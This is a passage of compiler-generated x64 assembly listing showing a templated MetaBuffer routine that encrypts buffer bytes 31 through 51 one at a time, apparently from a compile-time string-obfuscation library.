  00535	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$04$0HF@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@@std@@@@AEBAEE@Z ; MetaBuffer<5,117,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51> >::encrypt
  0053a	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00541	88 41 1f	 mov	 BYTE PTR [rcx+31], al
  00544	b8 01 00 00 00	 mov	 eax, 1
  00549	48 6b c0 1f	 imul	 rax, rax, 31
  0054d	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  00554	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  00558	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0055f	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$04$0HF@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@@std@@@@AEBAEE@Z ; MetaBuffer<5,117,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51> >::encrypt
  00564	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0056b	88 41 20	 mov	 BYTE PTR [rcx+32], al
  0056e	b8 01 00 00 00	 mov	 eax, 1
  00573	48 6b c0 20	 imul	 rax, rax, 32		; 00000020H
  00577	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  0057e	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  00582	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00589	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$04$0HF@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@@std@@@@AEBAEE@Z ; MetaBuffer<5,117,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51> >::encrypt
  0058e	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00595	88 41 21	 mov	 BYTE PTR [rcx+33], al
  00598	b8 01 00 00 00	 mov	 eax, 1
  0059d	48 6b c0 21	 imul	 rax, rax, 33		; 00000021H
  005a1	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  005a8	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  005ac	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  005b3	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$04$0HF@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@@std@@@@AEBAEE@Z ; MetaBuffer<5,117,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51> >::encrypt
  005b8	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  005bf	88 41 22	 mov	 BYTE PTR [rcx+34], al
  005c2	b8 01 00 00 00	 mov	 eax, 1
  005c7	48 6b c0 22	 imul	 rax, rax, 34		; 00000022H
  005cb	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  005d2	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  005d6	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  005dd	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$04$0HF@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@@std@@@@AEBAEE@Z ; MetaBuffer<5,117,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51> >::encrypt
  005e2	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  005e9	88 41 23	 mov	 BYTE PTR [rcx+35], al
  005ec	b8 01 00 00 00	 mov	 eax, 1
  005f1	48 6b c0 23	 imul	 rax, rax, 35		; 00000023H
  005f5	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  005fc	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  00600	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00607	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$04$0HF@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@@std@@@@AEBAEE@Z ; MetaBuffer<5,117,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51> >::encrypt
  0060c	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00613	88 41 24	 mov	 BYTE PTR [rcx+36], al
  00616	b8 01 00 00 00	 mov	 eax, 1
  0061b	48 6b c0 24	 imul	 rax, rax, 36		; 00000024H
  0061f	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  00626	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  0062a	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00631	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$04$0HF@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@@std@@@@AEBAEE@Z ; MetaBuffer<5,117,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51> >::encrypt
  00636	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0063d	88 41 25	 mov	 BYTE PTR [rcx+37], al
  00640	b8 01 00 00 00	 mov	 eax, 1
  00645	48 6b c0 25	 imul	 rax, rax, 37		; 00000025H
  00649	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  00650	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  00654	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0065b	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$04$0HF@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@@std@@@@AEBAEE@Z ; MetaBuffer<5,117,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51> >::encrypt
  00660	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00667	88 41 26	 mov	 BYTE PTR [rcx+38], al
  0066a	b8 01 00 00 00	 mov	 eax, 1
  0066f	48 6b c0 26	 imul	 rax, rax, 38		; 00000026H
  00673	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  0067a	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  0067e	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00685	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$04$0HF@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@@std@@@@AEBAEE@Z ; MetaBuffer<5,117,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51> >::encrypt
  0068a	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00691	88 41 27	 mov	 BYTE PTR [rcx+39], al
  00694	b8 01 00 00 00	 mov	 eax, 1
  00699	48 6b c0 27	 imul	 rax, rax, 39		; 00000027H
  0069d	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  006a4	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  006a8	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  006af	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$04$0HF@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@@std@@@@AEBAEE@Z ; MetaBuffer<5,117,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51> >::encrypt
  006b4	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  006bb	88 41 28	 mov	 BYTE PTR [rcx+40], al
  006be	b8 01 00 00 00	 mov	 eax, 1
  006c3	48 6b c0 28	 imul	 rax, rax, 40		; 00000028H
  006c7	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  006ce	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  006d2	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  006d9	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$04$0HF@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@@std@@@@AEBAEE@Z ; MetaBuffer<5,117,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51> >::encrypt
  006de	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  006e5	88 41 29	 mov	 BYTE PTR [rcx+41], al
  006e8	b8 01 00 00 00	 mov	 eax, 1
  006ed	48 6b c0 29	 imul	 rax, rax, 41		; 00000029H
  006f1	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  006f8	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  006fc	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00703	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$04$0HF@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@@std@@@@AEBAEE@Z ; MetaBuffer<5,117,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51> >::encrypt
  00708	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0070f	88 41 2a	 mov	 BYTE PTR [rcx+42], al
  00712	b8 01 00 00 00	 mov	 eax, 1
  00717	48 6b c0 2a	 imul	 rax, rax, 42		; 0000002aH
  0071b	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  00722	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  00726	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0072d	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$04$0HF@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@@std@@@@AEBAEE@Z ; MetaBuffer<5,117,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51> >::encrypt
  00732	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00739	88 41 2b	 mov	 BYTE PTR [rcx+43], al
  0073c	b8 01 00 00 00	 mov	 eax, 1
  00741	48 6b c0 2b	 imul	 rax, rax, 43		; 0000002bH
  00745	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  0074c	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  00750	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00757	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$04$0HF@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@@std@@@@AEBAEE@Z ; MetaBuffer<5,117,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51> >::encrypt
  0075c	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00763	88 41 2c	 mov	 BYTE PTR [rcx+44], al
  00766	b8 01 00 00 00	 mov	 eax, 1
  0076b	48 6b c0 2c	 imul	 rax, rax, 44		; 0000002cH
  0076f	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  00776	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  0077a	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00781	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$04$0HF@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@@std@@@@AEBAEE@Z ; MetaBuffer<5,117,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51> >::encrypt
  00786	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0078d	88 41 2d	 mov	 BYTE PTR [rcx+45], al
  00790	b8 01 00 00 00	 mov	 eax, 1
  00795	48 6b c0 2d	 imul	 rax, rax, 45		; 0000002dH
  00799	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  007a0	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  007a4	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  007ab	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$04$0HF@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@@std@@@@AEBAEE@Z ; MetaBuffer<5,117,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51> >::encrypt
  007b0	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  007b7	88 41 2e	 mov	 BYTE PTR [rcx+46], al
  007ba	b8 01 00 00 00	 mov	 eax, 1
  007bf	48 6b c0 2e	 imul	 rax, rax, 46		; 0000002eH
  007c3	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  007ca	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  007ce	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  007d5	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$04$0HF@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@@std@@@@AEBAEE@Z ; MetaBuffer<5,117,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51> >::encrypt
  007da	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  007e1	88 41 2f	 mov	 BYTE PTR [rcx+47], al
  007e4	b8 01 00 00 00	 mov	 eax, 1
  007e9	48 6b c0 2f	 imul	 rax, rax, 47		; 0000002fH
  007ed	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  007f4	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  007f8	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  007ff	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$04$0HF@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@@std@@@@AEBAEE@Z ; MetaBuffer<5,117,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51> >::encrypt
  00804	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0080b	88 41 30	 mov	 BYTE PTR [rcx+48], al
  0080e	b8 01 00 00 00	 mov	 eax, 1
  00813	48 6b c0 30	 imul	 rax, rax, 48		; 00000030H
  00817	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  0081e	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  00822	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00829	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$04$0HF@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@@std@@@@AEBAEE@Z ; MetaBuffer<5,117,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51> >::encrypt
  0082e	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00835	88 41 31	 mov	 BYTE PTR [rcx+49], al
  00838	b8 01 00 00 00	 mov	 eax, 1
  0083d	48 6b c0 31	 imul	 rax, rax, 49		; 00000031H
  00841	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  00848	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  0084c	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00853	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$04$0HF@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@@std@@@@AEBAEE@Z ; MetaBuffer<5,117,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51> >::encrypt
  00858	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0085f	88 41 32	 mov	 BYTE PTR [rcx+50], al
  00862	b8 01 00 00 00	 mov	 eax, 1
  00867	48 6b c0 32	 imul	 rax, rax, 50		; 00000032H
  0086b	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  00872	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  00876	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0087d	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$04$0HF@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@@std@@@@AEBAEE@Z ; MetaBuffer<5,117,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51> >::encrypt
  00882	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00889	88 41 33	 mov	 BYTE PTR [rcx+51], al
  0088c	b8 01 00 00 00	 mov	 eax, 1
  00891	48 6b c0 33	 imul	 rax, rax, 51		; 00000033H
  00895	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  0089c	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  008a0	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
